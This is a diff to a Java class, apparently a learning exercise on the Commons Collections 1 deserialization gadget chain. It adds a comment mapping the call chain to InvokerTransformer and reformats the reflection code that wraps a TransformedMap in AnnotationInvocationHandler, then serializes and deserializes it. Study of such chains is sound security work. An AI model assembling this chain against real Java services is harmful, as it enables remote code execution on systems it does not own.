@@ -15,6 +15,13 @@ import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
 
+/*
+* AnnotationHandler.readObject()
+* ->AbstractInputCheckedMapDecorator.MapEntry.setValue()
+*  ->TransformedMap.checkSetValue()
+*   ->ChainedTransformer.transform()
+*    ->InvokerTransformer.transform()
+* */
 public class CC1 {
     public void testChain(String[] args) {
         // 初步实验
@@ -88,13 +95,10 @@ public class CC1 {
                 TransformedMap.decorate(map, null, transformerChain);
 
         // 通过反射获取AnnotationInvocationHandler的实例
-        Class c = Class.forName(
-                "sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor annotationConstructor =
-                c.getDeclaredConstructor(Class.class, Map.class);
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
         annotationConstructor.setAccessible(true);
-        Object obj = annotationConstructor.
-                newInstance(Target.class, transformedMap);
+        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);
         serialize(obj);
         unserialize("./exec.bin");
     }
